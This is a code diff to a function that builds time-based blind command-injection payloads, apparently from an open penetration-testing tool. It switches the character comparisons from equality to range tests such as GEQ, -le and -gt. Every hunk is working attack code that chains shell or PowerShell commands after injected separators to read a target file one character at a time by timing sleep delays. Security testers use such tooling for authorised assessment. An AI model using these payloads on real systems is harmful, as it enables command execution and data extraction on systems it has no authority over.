@@ -333,7 +333,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
@@ -342,7 +342,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     else:
@@ -352,7 +352,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
+                "if [ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
@@ -364,14 +364,14 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "sleep 0" + separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                "[ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
                 )
       separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
+                "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
                 pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
                 pipe + "cut -c " + str(num_of_chars) +
                 pipe + "od -N 1 -i" +
